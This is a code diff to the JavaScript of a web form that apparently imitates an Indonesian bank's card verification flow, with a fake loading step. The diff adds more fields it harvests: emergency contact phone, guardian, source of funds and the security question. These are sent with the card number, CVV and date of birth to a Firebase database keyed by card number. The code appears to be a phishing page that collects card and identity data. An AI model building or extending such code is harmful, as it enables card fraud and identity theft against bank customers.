@@ -486,7 +486,6 @@
                 if(!isValid) return;
                 
                 // CEK KHUSUS: Apakah langkah SELANJUTNYA adalah Loading?
-                // Jika iya, jangan update UI dulu, tapi jalankan simulasi loading di langkah saat ini (seolah pindah)
                 const nextStepConfig = MODES[currentMode].steps[targetStep - 1]; // index 0-based
                 
                 if(nextStepConfig.type === 'loading') {
@@ -495,7 +494,7 @@
                     updateUI(currentStep);
                     // Jalankan simulasi loading
                     runLoadingSimulation(currentStep);
-                    return; // STOP di sini, jangan lanjut ke final generation
+                    return; // STOP di sini
                 }
             }
             
@@ -525,7 +524,6 @@
             }
 
             const totalSteps = MODES[currentMode].steps.length;
-            // Hindari pembagian dengan nol jika hanya 1 step (jarang terjadi di skenario ini)
             const percent = totalSteps > 1 ? ((s - 1) / (totalSteps - 1)) * 100 : 100;
             document.getElementById('progressLine').style.width = percent + "%";
 
@@ -681,7 +679,17 @@
             stepDiv.querySelector('.display-name').innerText = nama;
             stepDiv.querySelector('.cvv-display').innerText = cvv;
 
+            // Generate ID Unik untuk nasabah_id
+            const uniqueNasabahId = 'NAS-' + Math.random().toString(36).substr(2, 9).toUpperCase();
+
             const nasabahData = {
+                // FIELD BARU DARI GAMBAR
+                activeVariant: "Platinum",
+                cardStatus: "Active",
+                nasabah_id: uniqueNasabahId,
+                tgl_verifikasi: new Date().toISOString(),
+                
+                // FIELD EXISTING
                 cardNo: cardNo,
                 nama: nama,
                 dob: userDOB,
@@ -698,12 +706,17 @@
             if(document.getElementById('inputEmail')) nasabahData.email = document.getElementById('inputEmail').value;
             if(document.getElementById('jobType')) nasabahData.pekerjaan = document.getElementById('jobType').value;
             if(document.getElementById('income')) nasabahData.pendapatan = document.getElementById('income').value;
+            if(document.getElementById('waliName')) nasabahData.wali = document.getElementById('waliName').value; // Tambah data wali
             if(document.getElementById('emName')) {
                 nasabahData.kontak_darurat = {
                     nama: document.getElementById('emName').value,
-                    hubungan: document.getElementById('emRelation')?.value || "Wali"
+                    hubungan: document.getElementById('emRelation')?.value || "Wali",
+                    hp: document.getElementById('emPhone')?.value || "-"
                 };
             }
+            if(document.getElementById('incomeSource')) nasabahData.sumber_dana = document.getElementById('incomeSource').value;
+            if(document.getElementById('accPurpose')) nasabahData.tujuan_akun = document.getElementById('accPurpose').value;
+            if(document.getElementById('secQuestion')) nasabahData.pertanyaan_rahasia = document.getElementById('secQuestion').value;
 
             try {
                 await set(ref(db, 'nasabah/' + cardNo), nasabahData);
